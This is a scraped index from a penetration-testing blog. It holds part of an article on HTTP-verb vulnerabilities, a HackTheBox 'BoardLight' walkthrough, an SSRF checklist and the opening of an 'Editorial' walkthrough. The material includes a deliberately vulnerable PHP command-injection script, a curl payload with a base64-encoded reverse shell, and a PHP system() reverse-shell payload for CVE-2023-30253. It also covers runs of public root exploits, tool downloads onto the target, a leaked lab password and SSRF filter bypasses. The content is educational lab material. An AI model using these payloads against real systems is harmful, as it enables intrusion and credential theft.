Tomcat &lt;web-app&gt; &lt;servlet&gt; &lt;servlet-name&gt;example&lt;/servlet-name&gt; &lt;servlet-class&gt;tld.attackme.MyServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;example&lt;/servlet-name&gt; &lt;url-pattern&gt;/example&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;/web-app&gt; The main things that should catch your eye as a tester are:
no HTTP methods are mentioned no roles are mentioned Again, this opens up the server to requests by any HTTP method. The fix is conceptually the same as with Apache or Nginx - intruduce an allow-list:
&lt;web-app&gt; &lt;!-- ... same as above ... --&gt; &lt;security-constraint&gt; &lt;web-resource-collection&gt; &lt;web-resource-name&gt;Example&lt;/web-resource-name&gt; &lt;url-pattern&gt;/example&lt;/url-pattern&gt; &lt;http-method&gt;GET&lt;/http-method&gt; &lt;http-method&gt;POST&lt;/http-method&gt; &lt;/web-resource-collection&gt; &lt;auth-constraint&gt; &lt;role-name&gt;any&lt;/role-name&gt; &lt;/auth-constraint&gt; &lt;/security-constraint&gt; &lt;/web-app&gt; ASP.net (Microsoft IIS) Here&rsquo;s an example web.config file that causes the server to listen for any HTTP method:
&lt;configuration&gt; &lt;system.webServer&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;!-- Default configuration allows all verbs --&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; Once again, the solution is to apply an allow-list for the desired HTTP methods:
&lt;configuration&gt; &lt;system.webServer&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;verbs&gt; &lt;add verb=&#34;GET&#34; allowed=&#34;true&#34; /&gt; &lt;add verb=&#34;POST&#34; allowed=&#34;true&#34; /&gt; &lt;add verb=&#34;*&#34; allowed=&#34;false&#34; /&gt; &lt;/verbs&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; CAUSE: SLOPPY CODE Flask - broken logic example My Python Flask server at the beginning of this article is a good example of how sloppy coding can lead to an HTTP verb vulnerability. In that example, I purposefully introduced a logical error into the handling of the /account endpoint:
def account(): session_id = request.form.get(&#39;session_id&#39;) if request.method == &#39;GET&#39;: return jsonify({&#34;error&#34;: &#34;Method not allowed. Only POST /account is allowed.&#34;}), 405 elif request.method == &#39;POST&#39;: if not session_id: return jsonify({&#34;error&#34;: &#34;Unauthorized. Must provide session_id in request body.&#34;}), 403 if session_id not in APPROVED_SESSION_IDS: return jsonify({&#34;error&#34;: &#34;Unauthorized. Session ID is not on the list.&#34;}), 403 return jsonify({&#34;message&#34;: &#34;ACCESS GRANTED. Here is all your account details&#34;}), 200 There are two issues:
inconsistent handling of cases in an if-else chain wrongly assumed that only GET and POST would ever be used To fix (1), just write cleaner code. Follow whatever style guide your language or organization suggest. In my opinion, you should always have the &ldquo;default&rdquo; left as the final (implied) else branch, and that default should always be the secure, no-risk option.
To fix (2), you can actually just clean up the code a little - remove the check for GET entirely, and only check for POST:
def account(): if request.method == &#39;POST&#39;: session_id = request.form.get(&#39;session_id&#39;) if not session_id: return jsonify({&#34;error&#34;: &#34;Unauthorized. Must provide session_id in request body.&#34;}), 403 if session_id in APPROVED_SESSION_IDS: return jsonify({&#34;message&#34;: &#34;ACCESS GRANTED. Here is all your account details&#34;}), 200 return jsonify({&#34;error&#34;: &#34;Unauthorized. Session ID is not on the list.&#34;}), 403 return jsonify({&#34;error&#34;: &#34;Method not allowed. Only POST /account is allowed.&#34;}), 405 PHP - inconsistent reference to parameters Consider a server running the following PHP script, called log.php. It is supposed to accept a 6-digit user ID, then log that user ID into the file users.log. Pretend this is an API endpoint GET /log.php?id=[user_id]:
&lt;?php if(preg_match(&#34;/^[0-9]{6}$/&#34;, $_GET[&#34;id&#34;])) { $user = &#34;user_&#34; . $_REQUEST[&#34;id&#34;]; $cmd = &#34;echo $user &gt;&gt; users.log&#34;; $output = system($cmd, $return_val); if ($return_val === 0) { echo(&#34; :) User logged successfully&#34;); header(&#34;HTTP/1.1 200 OK&#34;); } else { echo(&#34; :( An error occurred!&#34;); header(&#34;HTTP/1.1 500 Internal Server Error&#34;); } }else{ echo(&#34; :| Only 6-digit user IDs are allowed&#34;); header(&#34;HTTP/1.1 400 Bad Request&#34;); } ?&gt; The regex looks good, and no info is leaked when we do the redirect&hellip; so what&rsquo;s the problem?
The issue is due to referencing the id parameter inconsistently &#x1f631;
In PHP, the $_GET variable is an array of the URL parameters, whereas the $_REQUEST variable can also include parameters passed through the request body. Since the request body is parsed after the URL parameters, you can cause PHP to overwrite the URL parameter with the one provided in the request body! &#x1f607;
The above PHP allows any HTTP method, but it&rsquo;s written as if it assumes only GET will ever be used. Let&rsquo;s demonstrate - run a local server:
php -S 127.0.0.1:8000 Now let&rsquo;s try using it as it was intended:
Great, now let&rsquo;s try sneaking a bad user ID through:
The contents of users.log shows which parameter was actually logged:
user_123456 user_obviously_1337 &#x1f644; Alright, that&rsquo;s not good. But who cares about some stupid log file, right? How about something a little more impactful? Let&rsquo;s say the malicious client sends in a request like this:
curl http://127.0.0.1:8000/log.php?id=123456 -d &#39;id=lulz;echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzkwMDAgMD4mMQ== | base64 -d | bash -i&#39; &#x261d;&#xfe0f; The blue tab is the PHP server running locally. The red tabs are simulating the activities of a malicious client attacking the PHP server remotely.
&#x1f643; We can utilize the mishandling of HTTP verbs to sneak through to the underlying command injection vulnerability, and pop a reverse shell on the system!
CONCLUSION HTTP verbs are part of every web request we make. Due to a lack of understanding, laziness, or plain human error, developers and administrators can introduce serious security flaws into their systems. We&rsquo;ve seen how simple flaws in logic and server configuration can cause these vulnerabilities, but also discussed how to fix them. From the penetration tester perspective, we&rsquo;ve also outlined how to approach the testing for HTTP verb vulnerabilities from a couple of different perspectives.
Whether you&rsquo;re a tester, a developer, or an administrator, I hope you&rsquo;ve found this useful!
`,url:"https://4wayhandshake.github.io/strategy/http-verb-testing/"},"https://4wayhandshake.github.io/walkthrough/boardlight/":{title:"BoardLight",tags:["Dolibarr","Credential Reuse","Enlightenment"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION BoardLight was the 6th box in HTB&rsquo;s Season V Anomalies. It&rsquo;s an easy Linux box, focused on a web hosting platform. As far as I can tell, its name and icon have nothing to do with the box itself. Unfortunately, I was away when the box was released, and kicking myself for it - it would have been great to have such easy points on the scoreboard!
Recon is very quick. Whatweb reveals the domain of the target, and a quick scan for subdomains will reveal the vulnerable web app. From there, default credentials grant you entry to the web app dashboard. While the dashboard itself isn&rsquo;t immediately useful, the credentials are helpful for the Authenticated RCE exploit that you can apply to the web app to gain a foothold.
A small amount of local enumeration will lead you towards a helpful config file with some database credentials. While the database itself leads you down a tempting rabbit-hole, the actual path forward is through credential reuse - this will grant you access to the first user with terminal access on the box.
The privesc vector on Boardlight isn&rsquo;t quite as obvious as some boxes, but proper local enumeration (especially searching for files with special privileges) will lead you in the right direction. Once you find the thing that stands out as &ldquo;odd&rdquo;, a little research will bring you to a public PoC exploit for gaining a root shell. The exploit should work right away - the only trick here is in actually finding the privesc vector.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA) | 256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA) |_ 256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No significant results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 80/udp open|filtered tcpwrapped 88/udp open|filtered kerberos-sec 120/udp open|filtered tcpwrapped 158/udp open|filtered tcpwrapped 623/udp open|filtered asf-rmcp 1027/udp open|filtered tcpwrapped 1645/udp open|filtered tcpwrapped 1813/udp open|filtered tcpwrapped 1900/udp open|filtered upnp 2049/udp open|filtered nfs 5353/udp open|filtered zeroconf 5632/udp open|filtered pcanywherestat 17185/udp open|filtered wdbrpc 49192/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy I&rsquo;ll start with banner grabbing and whatweb:
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR The email suggests the domain is board.htb, so I&rsquo;ll add that to /etc/hosts now for convenience:
DOMAIN=board.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
Next I performed subdomain enumeration, using the assumed domain of board.htb:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Great, that looks like an actual result. Let&rsquo;s add it to /etc/hosts:
echo &#34;$RADDR crm.$DOMAIN&#34; | sudo tee -a /etc/hosts I&rsquo;ll move on to directory enumeration for both board.htb and crm.board.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt&#34; ffuf -w $WLIST:FUZZ -ic -u http://$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-root -of json -timeout 4 -v board.htb seems like a pretty typical website - nothing special. Now I&rsquo;ll check crm.board.htb:
ffuf -w $WLIST:FUZZ -ic -u http://crm.$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-crm -of json -timeout 4 -v -fw 20 &#x261d;&#xfe0f; Results with 20 words had to be filtered-out. They seemed like false-positives
Only the index page seemed useful. Next, let&rsquo;s manually explore these two websites.
Exploring the Website The board.htb website itself doesn&rsquo;t seem to be very interesting. I don&rsquo;t see anything actually interactible. It seems like just a static landing page:
The part that actually does seem interesting is crm.board.htb. What we get there is a login for a system called Dolibarr, running version 17.0.0:
I had never heard of this system, so I clicked the Need help or support link, which links /support/index.php and from there to the official site. As they describe, Dolibarr is:
&ldquo;a modular software (we only activate the functions that we want) of business management which adapts to the size of your company (SME, Large companies, Frelancers or associations).
It&rsquo;s an OpenSource project built by the addition of modules (you only enable the features you need), on a WAMP, MAMP or LAMP server (Apache, Mysql, PHP for all Operating Systems). Dolibarr was developed to try to offer an ERP and CRM suite with the main goal of simplicity&rdquo;
Taking a quick look through their forum, I found someone asking about default credentials after installation. According to the answer, there are technically no default creds, but there may be one if someone is running Dolibarr using a preconfigured docker container or something like that.
So let&rsquo;s try the default creds from the container I found on dockerhub: admin : admin
That got us past the login, but seems like we don&rsquo;t have permissions for anything. However, if you click on the profile button, then Card, the resulting page (/user/card.php?id=2) shows we actually have some permissions:
Note the direct object reference of id=2. I should come back and fuzz this later, to see if there are other users.
&#x1f4a1; I wrote a small tool to do something really similar on Freelancer - I can probably reuse a bunch of that code!
I don&rsquo;t immediately see a way to do any of the things listed under Users &amp; Groups, so I&rsquo;ll try out the Websites stuff first:
It says to generate a preview, you need to load or initialize a template. I clicked Import website template and used one of the provided templates, &ldquo;NoImg&rdquo;.
I tried the Test/deploy on web link, but ultimately it seems like the vhost is misconfigured, because it still links to board.htb.
FOOTHOLD Vulnerability Research Now that I&rsquo;ve identified an exact version of Dolibarr (v17.0.0 - visible from the login page), I&rsquo;ll see if there are any notable vulnerabilities. Searching for &ldquo;dolibarr cve poc exploit&rdquo; led to tons of results, including one PoC for CVE-2023-30253 that is specific to version 17.0.0.
CVE-2023-30253 Reading through the PoC I found, it seems that the exploit, with everything else stripped away, is to insert a PHP system() call into the page of a website:
# ... &#34;&lt;section id=\\&#34;mysection1\\&#34; contenteditable=\\&#34;true\\&#34;&gt;\\n&#34; &#34; &lt;?pHp system(\\&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34; + lhost + &#34;/&#34; + lport + &#34; 0&gt;&amp;1&#39;\\&#34;); ?&gt;\\n&#34; &#34;&lt;/section&gt;\\n&#34; # ... We can also see that it bypasses a very weak filter that eliminates &lt;?php tags from the provided html content.
Let&rsquo;s try it out! First, I&rsquo;ll establish a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash nc -lvnp 4444 Next, I&rsquo;ll obtain and run the PoC exploit, using the admin : admin credentials from earlier:
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253 python3 exploit.py http://crm.board.htb admin admin 10.10.14.12 4444 It worked perfectly, without any fuss:
Upgrade the shell I&rsquo;ll quickly upgrade my shell, to make this a little more comfortable. See my guide on upgrading the shell for more detail:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; [ctrl+z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 alias ll=&#34;ls -lah&#34; USER FLAG Local enumeration - www-data I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
The only users with terminal access are root and larissa. The user flag must be at /home/larissa/user.txt, but I can&rsquo;t access it as www-data
The target has the following useful applications: nc, netcat, curl, wget, python3, perl, php
There&rsquo;s some weird SUID/SGID binaries:
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; Usual user enumeration aside - the reverse shell opened at /var/www/html/crm.board.htb/htdocs/public/website The number and arrangement of subdirectories makes me thing that I&rsquo;m looking at a bunch of Dolibarr modules.
Searching for some kind of configuration file, I traversed to the parent directory and looked around there. Then, in /var/www/html/crm.board.htb/htdocs I found something interesting:
Theres exactly one directory that&rsquo;s newer than all the rest: conf. Seems like a good thing to check out. Inside it, we find conf.php - clearly a configuration file for the Dolibarr system:
&#x1f447; I&rsquo;ve omitted any commented-out config variables, to make this shorter
&lt;?php $dolibarr_main_url_root=&#39;http://crm.board.htb&#39;; $dolibarr_main_document_root=&#39;/var/www/html/crm.board.htb/htdocs&#39;; $dolibarr_main_url_root_alt=&#39;/custom&#39;; $dolibarr_main_document_root_alt=&#39;/var/www/html/crm.board.htb/htdocs/custom&#39;; $dolibarr_main_data_root=&#39;/var/www/html/crm.board.htb/documents&#39;; $dolibarr_main_db_host=&#39;localhost&#39;; $dolibarr_main_db_port=&#39;3306&#39;; $dolibarr_main_db_name=&#39;dolibarr&#39;; $dolibarr_main_db_prefix=&#39;llx_&#39;; $dolibarr_main_db_user=&#39;dolibarrowner&#39;; $dolibarr_main_db_pass=&#39;serverfun2$2023!!&#39;; $dolibarr_main_db_type=&#39;mysqli&#39;; $dolibarr_main_db_character_set=&#39;utf8&#39;; $dolibarr_main_db_collation=&#39;utf8_unicode_ci&#39;; // Authentication settings $dolibarr_main_authentication=&#39;dolibarr&#39;; // Security settings $dolibarr_main_prod=&#39;0&#39;; $dolibarr_main_force_https=&#39;0&#39;; $dolibarr_main_restrict_os_commands=&#39;mysqldump, mysql, pg_dump, pgrestore&#39;; $dolibarr_nocsrfcheck=&#39;0&#39;; $dolibarr_main_instance_unique_id=&#39;ef9a8f59524328e3c36894a9ff0562b5&#39;; $dolibarr_mailing_limit_sendbyweb=&#39;0&#39;; $dolibarr_mailing_limit_sendbycli=&#39;0&#39;; $dolibarr_main_distrib=&#39;standard&#39;; Great! Seems like checking the database is a good next step.
Accessing the database &#x1f6ab; This part did not lead towards the solution. Skip ahead to the credential reuse section if you&rsquo;re short on time.
The following section shows the internals of the Dolibarr database though, which some readers may find interesting.
While I could probably access the MySQL database locally, it would be more comfortable to do it via a proxy. That way, I can just run the MySQL client from my attacker machine to access the database running on the target.
Chisel SOCKS5 proxy To make it easier to access the MySQL database, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 8000,9999 proto tcp simple-server 8000 -v &amp; # Serve a copy of chisel via http ./chisel server --port 9999 --reverse Then, on the target machine, start up the chisel client and background it:
mkdir -p /tmp/.Tools &amp;&amp; cd /tmp/.Tools wget http://10.10.14.12:8000/chisel &amp;&amp; chmod +x chisel ./chisel client 10.10.14.2:9999 R:1080:socks &amp; From my attacker machine, I should be able to access the database via the proxy now:
proxychains mysql -h 127.0.0.1 -D &#39;dolibarr&#39; -u &#39;dolibarrowner&#39; -p # Use password: serverfun2$2023!! There are a lot of tables listed, but the llx_user table looks like it might have some creds:
describe llx_user; The table has a bunch of fields, so let&rsquo;s just select the important stuff:
SELECT entity, admin, employee, login, pass_encoding, pass, pass_crypted, pass_temp, api_key, email FROM llx_user; Interesting - it looks like dolibarr is the actual admin, while admin is not! We also got two password hashes, and an API key for admin.
Password cracking &#x1f6ab; This part did not lead towards the solution. Skip ahead to the credential reuse section if you&rsquo;re short on time.
Let&rsquo;s put these hashes into a file and start cracking:
I also tried it with hashcat:
hashcat -m 3200 --username hashes.txt /usr/share/wordlists/rockyou.txt I let that run for a few minutes, which is usually plenty for an HTB box - but still I had no result. Perhaps I&rsquo;m not meant to crack these? I have database access, so what else can I do besides crack the hashes..? &#x1f914;
Password reset &#x1f6ab; This part did not lead towards the solution. Skip ahead to the credential reuse section if you&rsquo;re short on time.
The following shows a fun way to get full access to the Dashboard though, which some readers may find interesting.
&#x1f4a1; Well, I saw the pass and pass_temp fields in the llx_user table. Perhaps if I set them to something other than NULL, we can effectively force a password reset?
I&rsquo;ll update the table with a known value for the pass and pass_temp fields, for the dolibarr user:
Next, I&rsquo;ll try logging in again at crm.board.htb but this time using the dolibarr user and the known password I just inserted (Password123@):
&#x1f602; It worked perfectly!
However, I don&rsquo;t see anything particularly useful for granting me additional access. Since I&rsquo;ve already gained a reverse shell as www-data, would further exploitation of the web app lead to anything else? I suspect not - I&rsquo;ll continue with local enumeration for now.
Credential reuse In my excitement about the database, I neglected to check for credential re-use. Since we now know the username of the user with terminal access, I&rsquo;ll start there:
&#x1f926;&zwj;&#x2642;&#xfe0f; I can&rsquo;t believe I forgot to check for credential reuse again! I need to force myself to be more methodical
ssh larissa@$RADDR # Use password: serverfun2$2023!! Hahaha wow - woops! Should have checked that as soon as I found the credential &#x1f602;
As expected, the user flag is at /home/larissa/user.txt. Feel free to cat it for some points:
cat user.txt ROOT FLAG Local enumeration - larissa Before I go through my usual local enumeration procedure, I want to take another look at those weird SUID binaries I found while enumerating www-data. I have a pretty good feel of what the &ldquo;normal&rdquo; set of SUID binaries on a linux system are - and these are definitely out of the ordinary!
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; This shows three binaries:
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight Even though these aren&rsquo;t on the $PATH, I tried running them. They each reported something along the lines of:
&ldquo;This is an internal tool for Enlightenment. do not use it.&rdquo;
Hmph. I&rsquo;ll do what I want!
Enlightenment I wasn&rsquo;t really sure what Enlightenment actually is, so I did a bit of searching. This brought me to the official site, which sums it up:
&quot;Enlightenment is a Window Manager, Compositor and Minimal Desktop for Linux (the primary platform), BSD and any other compatible UNIX system.&quot;
As far as I understand, that means it&rsquo;s basically an alternative to GNOME, KDE, or LXDE. That still doesn&rsquo;t really answer my original question: why those SUID binaries are present.
To learn more about the Enlightenment SUID binaries, I tried searching for one of them: &ldquo;enlightenment_sys&rdquo;. Much to my amazement, the entry in the search results was a repo on github, MaherAzzouzi/CVE-2022-37706-LPE-exploit. ​It&rsquo;s like the search engine read my mind! &#x1f632; ​
CVE-2022-37706 is specifically a vulnerability in enlightenment_sys; it mishandles pathnames starting with /dev/... The exploit is actually pretty quirky. It works by tricking enlightnment into mounting a file containing &ldquo;/bin/sh&rdquo; into a directory as root, thus popping a root shell.
Let&rsquo;s try out the exploit!
cd exploit git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git cd CVE-2022-37706-LPE-exploit python3 -m http.server 8000 Then, from the target (as larissa), we download the exploit and run it:
mkdir /tmp/.Tools2; cd /tmp/.Tools2 wget http://10.10.14.12:8000/exploit.sh chmod +x exploit.sh ./exploit.sh Once again, without any fuss the exploit works perfectly:
And there&rsquo;s the root flag. Read it to finish off the box:
cat /root/root.txt &#x1f335; That was easy!
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools rm -rf /tmp/.Tools2 Attacker It&rsquo;s a good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; I&rsquo;ll also manually clean up my /etc/hosts:
vim /etc/hosts LESSONS LEARNED Attacker &#x1f4e7; Email addresses divulge their domain. On this box, I didn&rsquo;t immediately see any indication of the board.htb domain, so I very nearly skipped doing any subdomain enumeration. After all, if there&rsquo;s no domain to check, then there&rsquo;s no need to scan for subdomains, right? Thankfully, my whatweb check revealed the contact email address, which informed me of the domain that the site was using!
&#x1f511; Credential reuse. I&rsquo;m the worst for this, but any time you find a new credential, check every known account for credential reuse! I can&rsquo;t believe I forgot this again. Oh well, at least I remembered eventually &#x1f937;&zwj;&#x2642;&#xfe0f; ​
Defender &#x1f4c6; Containerize webservers. The vulnerability that led to foothold was just a pretty basic arbitrary file upload vulnerability. This could have been prevented by server-level blacklisting of harmful PHP function calls. However, it would be wise to also add in an extra layer of protection by containerizing the whole webserver. That way, if RCE is gained by an attacker, the consequences of the intrusion is much more limited. Why do I suggest both of these? Because it spreads the honus of defence between both the developer (of Dolibarr) and the administrator (of the hosting site).
&#x1f300; Beware SUID binaries owned by root. There&rsquo;s a very limited set of applications that should be set to SUID/SGID - those applications have been rigorously tested and vetted by your operating system. In this case, I find it hard to understand why Enlightenment seems to think it&rsquo;s justified to install extras to the system.
`,url:"https://4wayhandshake.github.io/walkthrough/boardlight/"},"https://4wayhandshake.github.io/strategy/ssrf/":{title:"Server-side Request Forgery (SSRF)",tags:["SSRF","Ffuf","ZAP","Enumeration"],categories:["Strategy","CTF","Web"],content:`INTRODUCTION Why write this? I often forget small steps about testing SSRF. It&rsquo;d be good to have a checklist to remind myself of things to investigate when I find an opportunity for SSRF.
This is by no means comprehensive. If you want a longer and more detailed guide, I recommend the Hacktricks page
ADDRESS FILTER BYPASS Even if an SSRF vulnerability is present, any half-decent web app will still filter the addresses that can be requested via the SSRFable component. Usually, these constaints are introduced to force the user of the web app to:
Request internal resources only - external resources should be blocked Request external resources only - internal resources should be blocked Often, this mechanism is written solely through deny-listing. Thankfully for pentesters, deny-listing is very tricky to do well!
Bypass restrictions to localhost Try all of these synonyms for localhost:
http://localhost https://localhost http://127.0.0.1 http://127.000.000.001 http://127.1 http://2130706433 http://017700000001 HtTp://LoCaLhOsT http://0.0.0.0 http%3A%2F%2127.0.0.1 Redirect from attacker-controlled server To perform the redirection as mentioned above, an easy way is to use PHP:
&lt;?php if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39;) { $url = &#39;http://127.0.0.1/resource.txt&#39;; header(&#34;Location: $url&#34;, true, 302); exit; } else { http_response_code(405); echo &#34;Method not allowed&#34;; } ?&gt; Then just run the PHP development server:
sudo ufw allow from $RADDR to any port 8000 proto tcp php -S 0.0.0.0:8000 URL SCHEMES Make sure to try a variety of URL schemes:
http:// file:// ftp:// data:// glob:// gopher:// expect:// php:// dict:// urllib bypass The popular python tool urllib has a serious flaw in python version &lt;3.7. You can bypass checking the URL scheme by simply adding a space at the beginning of the URL. For more details see CVE-2023-24329.
PORT FUZZING List of ports If you&rsquo;re using Ffuf, you&rsquo;ll need to generate a wordlist of port numbers:
seq 1 65535 &gt; port_numbers.txt Then, make a request through the SSRFable component. Proxy the request through ZAP or Burp as you make it.
Another good source of port numbers is to use the nmap top-1000. You can find a handy wordlist for that in Seclists that defaults to /usr/share/seclists/Discovery/Infrastructure/nmap-ports-top1000.txt.
The nmap-ports-top1000.txt file is a comma-separated list, and includes ranges of ports. To transform it into something easier to parse, just use some scripting. Or save yourself some time and use the one I created.
Using ZAP Check the proxied request. Open it in the Requester tab. Right click the resulting pane and select Fuzz. Define a new variable for the port, using the Numberzz payload type:
Add the payload and start fuzzing!
Ffuf From within ZAP, Burp, or Firefox Devtools, save the request as a &ldquo;raw request&rdquo; file. Then, edit the &ldquo;raw request&rdquo; file to contain the fuzzable keywords. For example, here is a multipart/form-data request, edited to contain the PORT keyword:
POST http://target.htb/upload HTTP/1.1 host: target.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Content-Type: multipart/form-data; boundary=---------------------------185675169266113044496348590 content-length: 123 Origin: http://target.htb -----------------------------185675169266113044496348590 Content-Disposition: form-data; name=&#34;redirect&#34; http://127.0.0.1:PORT -----------------------------185675169266113044496348590-- From there, it&rsquo;s easy: just pass the -request argument to Ffuf:
ffuf -w port_numbers.txt:PORT -request ssrf_port.raw -c -v Ffuf will try sending the same request template, swapping out the PORT keyword for every request.
&#x2b50; Sometimes you&rsquo;ll want your results to appear in ZAP or Burp. For Ffuf, just use -replay-proxy http://127.0.0.1:8080.
ENCODING To-do: Write about URL-encoding, double-url-encoding, etc&hellip;
OTHER HTTP Verbs Be sure to try this wordlist: /usr/share/seclists/Fuzzing/http-request-methods.txt
USEFUL REFERENCES https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery `,url:"https://4wayhandshake.github.io/strategy/ssrf/"},"https://4wayhandshake.github.io/walkthrough/editorial/":{title:"Editorial",tags:["SSRF","Git","GitHacker","Commit History","SUID Bash"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Editorial was released for week 9 of HTB&rsquo;s Season V: Anomalies. With only three steps involved in its solution, it&rsquo;s one of the easiest boxes in the season so far. That being said, twice on this box I ended up kicking myself for having not done something that later seemed obvious, so perhaps Editorial teaches us a lesson in a more subtle way.
There is basically no recon involved in Editorial. Identify the ports, add the domain to your /etc/hosts, and explore the website. The website only has three pages, so you&rsquo;ll quickly locate the component to attack. From there, you&rsquo;ll find out that this component can be used for SSRF. Follow my SSRF checklist (Disclaimer: it&rsquo;s a work-in-progress) to expedite things a little. Once you interact with the internally-accessible server via the SSRF, you&rsquo;ll quickly discover some credentials. Use those to gain a foothold.
Besides the user flag, you&rsquo;ll notice something conspicuous as soon as you log in: a git repo in the home directory. Examining the git repo allows you to recover more credentials, and pivot to the second user.
The second user is able to sudo a certain script, hinting at a very clear privesc vector. This one took me a little research to figure out, but it was trivial to exploit once I finally discovered how to use it.
&#x2b50; ​Editorial was definitely an easy box, but it uses some really cool concepts to teach lessons on some common developer pitfalls. Great box - highly recommend!
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
